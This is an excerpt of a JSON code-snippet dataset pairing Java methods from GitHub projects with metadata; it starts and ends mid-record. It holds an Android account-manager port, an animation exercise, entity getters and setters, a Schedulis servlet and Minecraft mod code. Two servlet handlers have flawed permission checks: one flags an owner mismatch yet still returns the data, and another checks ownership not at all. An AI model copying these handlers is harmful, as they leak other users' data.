handler.post(runnable);\n        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": "FutureTask", "implements": null, "modifiers": ["private"]}}, {"id": 30325, "method_name": "startTask", "class_name": "BaseFutureTask", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void startTask() {\n            new TaskExecutor().execute(this);\n        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": "FutureTask", "implements": null, "modifiers": ["private"]}}, {"id": 30326, "method_name": "done", "class_name": "Future2Task", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void done() {\n            if (mCallback != null) {\n                postRunnableToHandler(new Runnable() {\n                    public void run() {\n                        mCallback.run(Future2Task.this);\n                    }\n                });\n            }\n        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": "BaseFutureTask", "implements": ["AccountManagerFuture"], "modifiers": []}}, {"id": 30327, "method_name": "start", "class_name": "Future2Task", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Future2Task<T>", "snippet": "        public Future2Task<T> start() {\n            startTask();\n            return this;\n        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": "BaseFutureTask", "implements": ["AccountManagerFuture"], "modifiers": []}}, {"id": 30328, "method_name": "internalGetResult", "class_name": "Future2Task", "params": ["Long", "TimeUnit"], "throws": ["OperationCanceledException", "IOException", "AuthenticatorException"], "modifiers": ["private"], "return_type": "T", "snippet": "        private T internalGetResult(Long timeout, TimeUnit unit) throws OperationCanceledException,\n                IOException, AuthenticatorException {\n            try {\n                if (timeout == null) {\n                    return get();\n                } else {\n                    return get(timeout, unit);\n                }\n            } catch (InterruptedException e) {\n                // fall through and cancel\n            } catch (TimeoutException e) {\n                // fall through and cancel\n            } catch (CancellationException e) {\n                // fall through and cancel\n            } catch (ExecutionException e) {\n                final Throwable cause = e.getCause();\n                if (cause instanceof IOException) {\n                    throw (IOException) cause;\n                } else if (cause instanceof UnsupportedOperationException) {\n                    throw new AuthenticatorException(cause);\n                } else if (cause instanceof AuthenticatorException) {\n                    throw (AuthenticatorException) cause;\n                } else if (cause instanceof RuntimeException) {\n                    throw (RuntimeException) cause;\n                } else if (cause instanceof Error) {\n                    throw (Error) cause;\n                } else {\n                    throw new IllegalStateException(cause);\n                }\n            } finally {\n                boolean mayInterruptIfRunning = true;\n                cancel(mayInterruptIfRunning);\n            }\n            throw new OperationCanceledException();\n        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": "BaseFutureTask", "implements": ["AccountManagerFuture"], "modifiers": []}}, {"id": 30329, "method_name": "getResult", "class_name": "Future2Task", "params": [], "throws": ["OperationCanceledException", "IOException", "AuthenticatorException"], "modifiers": ["public"], "return_type": "T", "snippet": "        public T getResult() throws OperationCanceledException, IOException, AuthenticatorException {\n            return internalGetResult(null, null);\n        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": "BaseFutureTask", "implements": ["AccountManagerFuture"], "modifiers": []}}, {"id": 30330, "method_name": "getResult", "class_name": "Future2Task", "params": ["long", "TimeUnit"], "throws": ["OperationCanceledException", "IOException", "AuthenticatorException"], "modifiers": ["public"], "return_type": "T", "snippet": "        public T getResult(long timeout, TimeUnit unit) throws OperationCanceledException,\n                IOException, AuthenticatorException {\n            return internalGetResult(timeout, unit);\n        }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/accounts/AccountManager.java", "stars": "74", "class_props": {"extends": "BaseFutureTask", "implements": ["AccountManagerFuture"], "modifiers": []}}, {"id": 30331, "method_name": "onAttachedToWindow", "class_name": "Practice08ObjectAnimatorLayout", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onAttachedToWindow() {\n        super.onAttachedToWindow();\n\n        view = (Practice08ObjectAnimatorView) findViewById(R.id.objectAnimatorView);\n        animateBt = (Button) findViewById(R.id.animateBt);\n\n        animateBt.setOnClickListener(new OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                // TODO \u5728\u8fd9\u91cc\u5904\u7406\u70b9\u51fb\u4e8b\u4ef6\uff0c\u7528 ObjectAnimator \u64ad\u653e\u52a8\u753b\n                // 1. \u7528 ObjectAnimator \u521b\u5efa Animator \u5bf9\u8c61\n                // 2. \u7528 start() \u6267\u884c\u52a8\u753b\n                // *. \u8bb0\u5f97\u5728 Practice08ObjectAnimatorView \u4e2d\u4e3a progress \u6dfb\u52a0 setter/ getter \u65b9\u6cd5\uff01\n                ObjectAnimator animator = ObjectAnimator.ofFloat(view, \"progress\", 60f);\n                animator.setDuration(1000);\n                animator.setInterpolator(new FastOutSlowInInterpolator());\n                animator.start();\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson5/practice08/Practice08ObjectAnimatorLayout.java", "stars": "2", "class_props": {"extends": "RelativeLayout", "implements": null, "modifiers": ["public"]}}, {"id": 30332, "method_name": "getId", "class_name": "AttAchDomain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/AttAchDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30333, "method_name": "setId", "class_name": "AttAchDomain", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(Integer id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/AttAchDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30334, "method_name": "getFname", "class_name": "AttAchDomain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getFname() {\n        return fname;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/AttAchDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30335, "method_name": "setFname", "class_name": "AttAchDomain", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFname(String fname) {\n        this.fname = fname;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/AttAchDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30336, "method_name": "getFtype", "class_name": "AttAchDomain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getFtype() {\n        return ftype;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/AttAchDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30337, "method_name": "setFtype", "class_name": "AttAchDomain", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFtype(String ftype) {\n        this.ftype = ftype;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/AttAchDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30338, "method_name": "getFkey", "class_name": "AttAchDomain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getFkey() {\n        return fkey;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/AttAchDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30339, "method_name": "setFkey", "class_name": "AttAchDomain", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFkey(String fkey) {\n        this.fkey = fkey;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/AttAchDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30340, "method_name": "getAuthorId", "class_name": "AttAchDomain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getAuthorId() {\n        return authorId;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/AttAchDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30341, "method_name": "setAuthorId", "class_name": "AttAchDomain", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAuthorId(Integer authorId) {\n        this.authorId = authorId;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/AttAchDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30342, "method_name": "getCreated", "class_name": "AttAchDomain", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getCreated() {\n        return created;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/AttAchDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30343, "method_name": "setCreated", "class_name": "AttAchDomain", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCreated(Integer created) {\n        this.created = created;\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/AttAchDomain.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30344, "method_name": "init", "class_name": "UserParamsServlet", "params": ["ServletConfig"], "throws": ["ServletException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void init(final ServletConfig config) throws ServletException {\n        super.init(config);\n        Injector injector = ServiceProvider.SERVICE_PROVIDER.getInjector()\n            .createChildInjector(new UserParamsModule());\n        userParamsService = injector.getInstance(UserParamsService.class);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-user-params/src/main/java/com/webank/wedatasphere/schedulis/userparams/servlet/UserParamsServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 30345, "method_name": "handleGet", "class_name": "UserParamsServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session"], "throws": ["ServletException", "IOException"], "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void handleGet(final HttpServletRequest req, final HttpServletResponse resp,\n        final Session session) throws ServletException, IOException {\n\n        if (hasParam(req, \"ajax\")) {\n            handleAJAXAction(req, resp, session);\n        } else {\n            handleSystemPage(req, resp, session);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-user-params/src/main/java/com/webank/wedatasphere/schedulis/userparams/servlet/UserParamsServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 30346, "method_name": "handleAJAXAction", "class_name": "UserParamsServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session"], "throws": ["ServletException", "IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void handleAJAXAction(final HttpServletRequest req,\n        final HttpServletResponse resp, final Session session) throws ServletException,\n        IOException {\n        final HashMap<String, Object> ret = new HashMap<>();\n        final String ajaxName = getParam(req, \"ajax\");\n\n        if (ajaxName.equals(\"user_role\")) {\n            ajaxGetUserRole(req, resp, session, ret);\n        } else if (ajaxName.equals(\"fetchAllUserVariable\")){\n            ajaxFetchAllUserVariable(req, resp, session, ret);\n        } else if (ajaxName.equals(\"addUserVariable\")){\n            ajaxAddUserVariable(req, resp, session, ret);\n        } else if (ajaxName.equals(\"deleteUserVariable\")){\n            ajaxDeleteUserVariable(req, resp, session, ret);\n        } else if (ajaxName.equals(\"updateUpdateUserVariable\")){\n            ajaxUpdateUpdateUserVariable(req, resp, session, ret);\n        } else if (ajaxName.equals(\"fetchUserVariableById\")){\n            ajaxFetchUserVariableById(req, resp, session, ret);\n        } else if(ajaxName.equals(\"loadWtssUser\")){\n            ajaxLoadWtssUser(req, resp, session, ret);\n        }\n\n        if (ret != null) {\n            this.writeJSON(resp, ret);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-user-params/src/main/java/com/webank/wedatasphere/schedulis/userparams/servlet/UserParamsServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 30347, "method_name": "ajaxGetUserRole", "class_name": "UserParamsServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session", "HashMap<String,Object>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void ajaxGetUserRole(final HttpServletRequest req,\n        final HttpServletResponse resp, final Session session, final HashMap<String, Object> ret) {\n        final String[] userRoles = session.getUser().getRoles().toArray(new String[0]);\n        ret.put(\"userRoles\", userRoles);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-user-params/src/main/java/com/webank/wedatasphere/schedulis/userparams/servlet/UserParamsServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 30348, "method_name": "handleSystemPage", "class_name": "UserParamsServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session"], "throws": ["ServletException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void handleSystemPage(final HttpServletRequest req, final HttpServletResponse resp, final Session session)\n        throws ServletException {\n        final Page page =\n            newPage(req, resp, session, \"/com.webank.wedatasphere.schedulis.viewer.userparams/userparams-manager.vm\");\n        page.add(\"wtssUser\", session.getUser().getUserId());\n\n        String languageType = LoadJsonUtils.getLanguageType();\n        Map<String, String> viewDataMap;\n        Map<String, String> subPageMap1;\n        if (languageType.equalsIgnoreCase(\"zh_CN\")) {\n            viewDataMap = LoadJsonUtils.transJson(\"/com.webank.wedatasphere.schedulis.i18n.conf/az-webank-user-params-zh_CN.json\",\n                \"com.webank.wedatasphere.schedulis.viewer.userparams.userparams-manager.vm\");\n            subPageMap1 = LoadJsonUtils.transJson(\"/com.webank.wedatasphere.schedulis.i18n.conf/azkaban-web-server-zh_CN.json\",\n                \"azkaban.webapp.servlet.velocity.nav.vm\");\n        }else {\n            viewDataMap = LoadJsonUtils.transJson(\"/com.webank.wedatasphere.schedulis.i18n.conf/az-webank-user-params-en_US.json\",\n                \"com.webank.wedatasphere.schedulis.viewer.userparams.userparams-manager.vm\");\n            subPageMap1 = LoadJsonUtils.transJson(\"/com.webank.wedatasphere.schedulis.i18n.conf/azkaban-web-server-en_US.json\",\n                \"azkaban.webapp.servlet.velocity.nav.vm\");\n        }\n\n        // \u6dfb\u52a0\u56fd\u9645\u5316\u6807\u7b7e\n        viewDataMap.forEach(page::add);\n        subPageMap1.forEach(page::add);\n        page.add(\"currentlangType\", languageType);\n        page.render();\n\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-user-params/src/main/java/com/webank/wedatasphere/schedulis/userparams/servlet/UserParamsServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 30349, "method_name": "loadUserParamsServletI18nData", "class_name": "UserParamsServlet", "params": [], "throws": null, "modifiers": ["private"], "return_type": "Map<String,String>", "snippet": "    private Map<String, String> loadUserParamsServletI18nData() {\n        String languageType = LoadJsonUtils.getLanguageType();\n        Map<String, String> dataMap;\n        if (languageType.equalsIgnoreCase(\"zh_CN\")) {\n            dataMap = LoadJsonUtils.transJson(\"/com.webank.wedatasphere.schedulis.i18n.conf/az-webank-user-params-zh_CN.json\",\n                \"com.webank.wedatasphere.schedulis.userparams.servlet.UserParamsServlet\");\n        }else {\n            dataMap = LoadJsonUtils.transJson(\"/com.webank.wedatasphere.schedulis.i18n.conf/az-webank-user-params-en_US.json\",\n                \"com.webank.wedatasphere.schedulis.userparams.servlet.UserParamsServlet\");\n        }\n        return dataMap;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-user-params/src/main/java/com/webank/wedatasphere/schedulis/userparams/servlet/UserParamsServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 30350, "method_name": "handlePost", "class_name": "UserParamsServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session"], "throws": ["ServletException", "IOException"], "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void handlePost(final HttpServletRequest req, final HttpServletResponse resp,\n        final Session session) throws ServletException, IOException {\n        if (hasParam(req, \"ajax\")) {\n            handleAJAXAction(req, resp, session);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-user-params/src/main/java/com/webank/wedatasphere/schedulis/userparams/servlet/UserParamsServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 30351, "method_name": "ajaxFetchAllUserVariable", "class_name": "UserParamsServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session", "HashMap<String,Object>"], "throws": ["ServletException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void ajaxFetchAllUserVariable(final HttpServletRequest req, final HttpServletResponse resp, final Session session, final HashMap<String, Object> ret) throws ServletException {\n        com.alibaba.fastjson.JSONObject jsonObject = HttpRequestUtils.parseRequestToJsonObject(req);\n        UserVariable userVariable = com.alibaba.fastjson.JSONObject.toJavaObject(jsonObject, UserVariable.class);\n        if(!userVariable.getOwner().equals(session.getUser().getUserId())){\n            ret.put(\"error\", \"No Access Permission\");\n        }\n        List<UserVariable> userVariables = this.userParamsService.fetchAllUserVariable(userVariable);\n        ret.put(\"userparams\", userVariables);\n        Map<String, String> sourceMap = loadUserParamsServletI18nData();\n        ret.put(\"modify\", sourceMap.get(\"modify\"));\n\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-user-params/src/main/java/com/webank/wedatasphere/schedulis/userparams/servlet/UserParamsServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 30352, "method_name": "ajaxAddUserVariable", "class_name": "UserParamsServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session", "HashMap<String,Object>"], "throws": ["ServletException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void ajaxAddUserVariable(final HttpServletRequest req, final HttpServletResponse resp, final Session session, final HashMap<String, Object> ret) throws ServletException {\n        com.alibaba.fastjson.JSONObject jsonObject = HttpRequestUtils.parseRequestToJsonObject(req);\n        UserVariable userVariable = com.alibaba.fastjson.JSONObject.toJavaObject(jsonObject, UserVariable.class);\n\n        for(WtssUser user: userVariable.getUsers()){\n            if(!this.userParamsService.checkWtssUserIsExist(user.getUserId())){\n                ret.put(\"error\", \"Failed, User[\" + user.getUserId() + \"] not exist.\");\n                return;\n            }\n        }\n\n        userVariable.setOwner(session.getUser().getUserId());\n        if(this.userParamsService.addUserVariable(userVariable)){\n            ret.put(\"success\", \"Request Success\");\n        } else {\n            ret.put(\"error\", \"Request Failed\");\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-user-params/src/main/java/com/webank/wedatasphere/schedulis/userparams/servlet/UserParamsServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 30353, "method_name": "ajaxDeleteUserVariable", "class_name": "UserParamsServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session", "HashMap<String,Object>"], "throws": ["ServletException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void ajaxDeleteUserVariable(final HttpServletRequest req, final HttpServletResponse resp, final Session session, final HashMap<String, Object> ret) throws ServletException {\n        com.alibaba.fastjson.JSONObject jsonObject = HttpRequestUtils.parseRequestToJsonObject(req);\n        UserVariable userVariable = com.alibaba.fastjson.JSONObject.toJavaObject(jsonObject, UserVariable.class);\n        userVariable.setOwner(session.getUser().getUserId());\n        if(this.userParamsService.deleteUserVariable(userVariable)){\n            ret.put(\"success\", \"Request Success\");\n        } else {\n            ret.put(\"error\", \"Request Failed\");\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-user-params/src/main/java/com/webank/wedatasphere/schedulis/userparams/servlet/UserParamsServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 30354, "method_name": "ajaxUpdateUpdateUserVariable", "class_name": "UserParamsServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session", "HashMap<String,Object>"], "throws": ["ServletException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void ajaxUpdateUpdateUserVariable(final HttpServletRequest req, final HttpServletResponse resp, final Session session, final HashMap<String, Object> ret) throws ServletException {\n        com.alibaba.fastjson.JSONObject jsonObject = HttpRequestUtils.parseRequestToJsonObject(req);\n        UserVariable userVariable = com.alibaba.fastjson.JSONObject.toJavaObject(jsonObject, UserVariable.class);\n        userVariable.setOwner(session.getUser().getUserId());\n        for(WtssUser user: userVariable.getUsers()){\n            if(!this.userParamsService.checkWtssUserIsExist(user.getUserId())){\n                ret.put(\"error\", \"Failed, User[\" + user.getUserId() + \"] not exist.\");\n                return;\n            }\n        }\n        if(this.userParamsService.updateUserVariable(userVariable)){\n            ret.put(\"success\", \"Request Success\");\n        } else {\n            ret.put(\"error\", \"Request Failed\");\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-user-params/src/main/java/com/webank/wedatasphere/schedulis/userparams/servlet/UserParamsServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 30355, "method_name": "ajaxFetchUserVariableById", "class_name": "UserParamsServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session", "HashMap<String,Object>"], "throws": ["ServletException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void ajaxFetchUserVariableById(final HttpServletRequest req, final HttpServletResponse resp, final Session session, final HashMap<String, Object> ret) throws ServletException {\n        com.alibaba.fastjson.JSONObject jsonObject = HttpRequestUtils.parseRequestToJsonObject(req);\n        UserVariable userVariable = com.alibaba.fastjson.JSONObject.toJavaObject(jsonObject, UserVariable.class);\n        userVariable = this.userParamsService.getUserVariableById(userVariable.getId());\n        if(userVariable != null) {\n            ret.put(\"userparam\", userVariable);\n        } else {\n            ret.put(\"error\", \"Can not find.\");\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-user-params/src/main/java/com/webank/wedatasphere/schedulis/userparams/servlet/UserParamsServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 30356, "method_name": "ajaxLoadWtssUser", "class_name": "UserParamsServlet", "params": ["HttpServletRequest", "HttpServletResponse", "Session", "HashMap<String,Object>"], "throws": ["ServletException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void ajaxLoadWtssUser(final HttpServletRequest req, final HttpServletResponse resp, final Session session, final HashMap<String, Object> ret) throws ServletException {\n\n        String searchName = req.getParameter(\"serach\");\n        int pageNum = getIntParam(req, \"page\");\n        int pageSize = getIntParam(req, \"pageSize\");\n        List<Map<String, Object>> webankUserSelectList = new ArrayList<>();\n        JSONObject items = new JSONObject();\n        try {\n            int webankUserTotalCount = this.userParamsService.getWtssUserTotal();\n            List<WtssUser> webankUserList = this.userParamsService.findAllWtssUserPageList(searchName, (pageNum-1) * pageSize, pageSize);\n\n            for(WtssUser webankUser : webankUserList){\n                Map<String, Object> selectItem = new HashMap<>();\n                selectItem.put(\"id\", webankUser.getUsername());\n                selectItem.put(\"username\", webankUser.getUsername());\n                selectItem.put(\"text\", webankUser.getFullName());\n                webankUserSelectList.add(selectItem);\n            }\n            ret.put(\"webankUserTotalCount\", webankUserTotalCount);\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n\n        ret.put(\"page\", pageNum);\n        ret.put(\"webankUserList\", webankUserSelectList);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-webank-user-params/src/main/java/com/webank/wedatasphere/schedulis/userparams/servlet/UserParamsServlet.java", "stars": "18", "class_props": {"extends": "LoginAbstractAzkabanServlet", "implements": null, "modifiers": ["public"]}}, {"id": 30357, "method_name": "initElements", "class_name": "RoughSandstoneBlock", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\n\t\telements.blocks.add(() -> new CustomBlock());\n\t\telements.items\n\t\t\t\t.add(() -> new BlockItem(block, new Item.Properties().group(ItemGroup.BUILDING_BLOCKS)).setRegistryName(block.getRegistryName()));\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/RoughSandstoneBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 30358, "method_name": "init", "class_name": "RoughSandstoneBlock", "params": ["FMLCommonSetupEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void init(FMLCommonSetupEvent event) {\n\t\tfor (Biome biome : ForgeRegistries.BIOMES.getValues()) {\n\t\t\tboolean biomeCriteria = false;\n\t\t\tif (ForgeRegistries.BIOMES.getKey(biome).equals(new ResourceLocation(\"desert\")))\n\t\t\t\tbiomeCriteria = true;\n\t\t\tif (ForgeRegistries.BIOMES.getKey(biome).equals(new ResourceLocation(\"desert_hills\")))\n\t\t\t\tbiomeCriteria = true;\n\t\t\tif (ForgeRegistries.BIOMES.getKey(biome).equals(new ResourceLocation(\"desert_lakes\")))\n\t\t\t\tbiomeCriteria = true;\n\t\t\tif (!biomeCriteria)\n\t\t\t\tcontinue;\n\t\t\tbiome.addFeature(GenerationStage.Decoration.UNDERGROUND_ORES, new OreFeature(OreFeatureConfig::deserialize) {\n\t\t\t\t@Override\n\t\t\t\tpublic boolean place(IWorld world, ChunkGenerator generator, Random rand, BlockPos pos, OreFeatureConfig config) {\n\t\t\t\t\tDimensionType dimensionType = world.getDimension().getType();\n\t\t\t\t\tboolean dimensionCriteria = false;\n\t\t\t\t\tif (dimensionType == DimensionType.OVERWORLD)\n\t\t\t\t\t\tdimensionCriteria = true;\n\t\t\t\t\tif (!dimensionCriteria)\n\t\t\t\t\t\treturn false;\n\t\t\t\t\treturn super.place(world, generator, rand, pos, config);\n\t\t\t\t}\n\t\t\t}.withConfiguration(new OreFeatureConfig(OreFeatureConfig.FillerBlockType.create(\"roughsandstone\", \"roughsandstone\", blockAt -> {\n\t\t\t\tboolean blockCriteria = false;\n\t\t\t\tif (blockAt.getBlock() == Blocks.SANDSTONE.getDefaultState().getBlock())\n\t\t\t\t\tblockCriteria = true;\n\t\t\t\treturn blockCriteria;\n\t\t\t}), block.getDefaultState(), 32)).withPlacement(Placement.COUNT_RANGE.configure(new CountRangeConfig(32, 0, 0, 256))));\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/RoughSandstoneBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 30359, "method_name": "getPickBlock", "class_name": "CustomBlock", "params": ["BlockState", "RayTraceResult", "IBlockReader", "BlockPos", "PlayerEntity"], "throws": null, "modifiers": ["public"], "return_type": "ItemStack", "snippet": "\t\tpublic ItemStack getPickBlock(BlockState state, RayTraceResult target, IBlockReader world, BlockPos pos, PlayerEntity player) {\n\t\t\treturn new ItemStack(RoughSandstoneBlock.block, (int) (1));\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/RoughSandstoneBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30360, "method_name": "getDrops", "class_name": "CustomBlock", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\n\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\n\t\t\tif (!dropsOriginal.isEmpty())\n\t\t\t\treturn dropsOriginal;\n\t\t\treturn Collections.singletonList(new ItemStack(this, 0));\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/RoughSandstoneBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 30361, "method_name": "getObject", "class_name": "IconSubTitleItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Type", "snippet": "    public Type getObject() {\n        return object;\n    }", 